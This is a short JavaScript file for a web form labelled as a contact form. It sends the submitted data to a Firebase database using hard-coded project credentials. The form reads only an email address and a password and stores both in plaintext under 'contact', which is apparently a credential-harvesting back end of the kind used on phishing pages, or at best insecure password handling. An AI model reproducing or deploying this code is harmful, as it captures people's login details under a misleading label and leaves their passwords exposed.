const firebaseConfig = {
    apiKey: "AIzaSyC8aCye6E4vo2LDYCaTNKkWuHgjg3Bo3dU",
    authDomain: "contact-form-7fe0d.firebaseapp.com",
    databaseURL: "https://contact-form-7fe0d-default-rtdb.firebaseio.com",
    projectId: "contact-form-7fe0d",
    storageBucket: "contact-form-7fe0d.appspot.com",
    messagingSenderId: "226983904667",
    appId: "1:226983904667:web:70eabab3fb3b71d9768d3e"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("contact");
  
  document.getElementById("contactForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var email = getElementVal("email");
    var pass = getElementVal("pass");
   
   
    
    
  
    saveMessages(email,pass);
    document.getElementById("contactForm").reset();
  }
  
  const saveMessages = (email,pass) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      email:email,
      pass:pass,
      
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };